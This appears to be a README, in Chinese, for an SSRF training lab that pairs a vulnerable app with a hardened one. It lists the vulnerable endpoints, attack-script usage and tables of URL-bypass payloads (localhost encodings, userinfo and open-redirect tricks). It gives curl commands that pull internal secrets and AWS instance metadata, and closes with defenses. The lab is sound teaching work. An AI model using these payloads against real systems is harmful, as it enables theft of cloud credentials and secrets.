# A10:2021 - Server-Side Request Forgery (SSRF)

## 概述

SSRF 漏洞發生在應用程式在獲取遠端資源時，未驗證使用者提供的 URL。攻擊者可利用此漏洞強迫應用程式發送精心設計的請求到非預期的目的地，即使該目的地受到防火牆、VPN 或網路 ACL 的保護。

## CWE 參考

| CWE ID | 名稱 |
|--------|------|
| CWE-918 | Server-Side Request Forgery (SSRF) |

## 漏洞端點

### 漏洞版本 (http://localhost:8081)

| 端點 | 漏洞說明 |
|------|----------|
| `POST /api/webhook/test?url=<URL>` | 使用 RestTemplate 直接請求任意 URL |
| `GET /api/webhook/fetch?url=<URL>` | 使用 URLConnection 抓取任意 URL 內容 |
| `POST /api/webhook/import?url=<URL>` | 從任意 URL 匯入資料 |
| `GET /api/webhook/check?url=<URL>` | 探測內部服務是否存活 |

### 安全版本 (http://localhost:8082)

| 防禦措施 | 說明 |
|----------|------|
| URL 白名單 | 只允許 `api.example.com`, `webhook.example.com` 等 |
| 私有 IP 阻擋 | 阻擋 `10.x`, `172.16-31.x`, `192.168.x`, `169.254.x` |
| localhost 阻擋 | 阻擋 `localhost`, `127.0.0.1`, `0.0.0.0` |
| IPv6 阻擋 | 阻擋 `::1`, `fe80:`, `fc00:`, `fd00:` |
| 協議限制 | 只允許 HTTP/HTTPS |
| 權限要求 | 需要 ADMIN 角色 |
| 審計日誌 | 記錄所有 SSRF 嘗試 |

## 攻擊腳本

### 1. ssrf_exploit.py - 基礎 SSRF 攻擊

```bash
# 存取內部服務
python ssrf_exploit.py --internal

# 掃描內部網路
python ssrf_exploit.py --scan

# 雲端 Metadata 竊取
python ssrf_exploit.py --cloud

# 比較漏洞/安全版本
python ssrf_exploit.py --compare

# 完整演示
python ssrf_exploit.py --all
```

### 2. url_bypass.py - URL 驗證繞過技術

```bash
# 展示 localhost 各種表示法
python url_bypass.py --localhost

# 測試所有 bypass 技術
python url_bypass.py --test

# 測試特定 payload
python url_bypass.py --payload "http://[::1]:8080/"

# 比較漏洞/安全版本
python url_bypass.py --compare
```

## URL Bypass 技術測試結果

在此環境中測試的各種繞過技術及其結果：

### 對 internal-api:8080 的測試（漏洞版本）

| 技術 | Payload 範例 | 結果 | 說明 |
|------|-------------|------|------|
| 原始請求 | `http://internal-api:8080/secrets` | ✅ 成功 | 基準測試 |
| DNS 大小寫 | `http://INTERNAL-API:8080/secrets` | ✅ 成功 | DNS 不區分大小寫 |
| 混合大小寫 | `http://iNtErNaL-ApI:8080/secrets` | ✅ 成功 | 繞過字串比對 |
| URL userinfo | `http://allowed.com@internal-api:8080/secrets` | ✅ 成功 | URL userinfo 混淆 |
| 雙斜線 | `http://internal-api:8080///secrets` | ✅ 成功 | 路徑解析混淆 |
| 開放重定向 | `http://internal-api:8080/redirect?url=...` | ✅ 成功 | 利用內部重定向 |
| URL 編碼 | `http://%69%6e%74%65%72%6e%61%6c...` | ❌ 失敗 | Java URL 不解析編碼主機名 |

### Localhost 表示法（理論/參考）

以下是 `127.0.0.1` 的各種等效表示法：

| 表示法 | 值 | 適用場景 |
|--------|------|----------|
| 原始 IP | `127.0.0.1` | 標準格式 |
| localhost | `localhost` | DNS 解析 |
| Decimal | `2130706433` | 繞過字串黑名單 |
| Octal | `0177.0.0.01` | 部分系統支援 |
| Hex (full) | `0x7f000001` | 部分系統支援 |
| IPv6 | `[::1]` | IPv6 localhost |
| IPv6 mapped | `[::ffff:127.0.0.1]` | IPv6 映射 IPv4 |
| 短格式 | `127.1` | 省略零 |
| 零 | `0.0.0.0` | 某些系統等同 localhost |

⚠️ **注意**：在 Docker 環境中，容器內的 localhost 指向容器自身，而非宿主機。因此 localhost bypass 測試需要在真實環境或使用 `host.docker.internal` 進行。

## 攻擊場景

### 1. 存取內部服務

```bash
# 透過 SSRF 存取 Docker 內部的 internal-api
curl "http://localhost:8081/api/webhook/fetch?url=http://internal-api:8080/secrets"
```

**結果**：獲得內部 API 的敏感資料，包括資料庫密碼、API 金鑰、JWT 密鑰。

### 2. 雲端 Metadata 竊取

```bash
# AWS EC2 Metadata（真實雲端環境）
curl "http://localhost:8081/api/webhook/fetch?url=http://169.254.169.254/latest/meta-data/"

# 模擬的 Cloud Metadata
curl "http://localhost:8081/api/webhook/fetch?url=http://internal-api:8080/cloud-metadata"
```

**結果**：可能洩露 IAM 憑證、Instance ID 等敏感資訊。

### 3. 開放重定向繞過

```bash
# 利用 internal-api 的 /redirect 端點繞過白名單
curl "http://localhost:8081/api/webhook/fetch?url=http://internal-api:8080/redirect?url=http://internal-api:8080/secrets"
```

**結果**：即使目標 URL 不在白名單，透過開放重定向仍可存取。

### 4. 內部網路掃描

```bash
python ssrf_exploit.py --scan
```

**結果**：探測 Docker 網路中的其他服務（postgres、redis 等）。

## 防禦建議

### 網路層

1. **網路分段**：將遠端資源存取功能隔離在獨立網路
2. **防火牆規則**：預設拒絕，明確允許必要的出站流量
3. **記錄監控**：記錄所有網路流量並監控異常

### 應用層

1. **URL 白名單**：使用正向白名單，僅允許已知安全的目標
2. **解析後驗證**：驗證解析後的 IP 而非原始字串
3. **禁止重定向**：不跟隨 HTTP 重定向，或驗證每個重定向目標
4. **協議限制**：僅允許 HTTP/HTTPS
5. **不回傳原始回應**：過濾敏感資訊後再回傳
6. **權限控制**：限制誰可以使用外部請求功能

### ⚠️ 不要使用

- **黑名單**：攻擊者有大量繞過技術
- **正則表達式驗證**：容易被繞過
- **僅驗證主機名**：需驗證解析後的 IP

## 檔案結構

```
scripts/a10/
├── README.md              # 本文件
├── requirements.txt       # Python 依賴
├── ssrf_exploit.py        # 基礎 SSRF 攻擊腳本
└── url_bypass.py          # URL 驗證繞過技術
```

## 參考資源

- [OWASP A10:2021 - SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
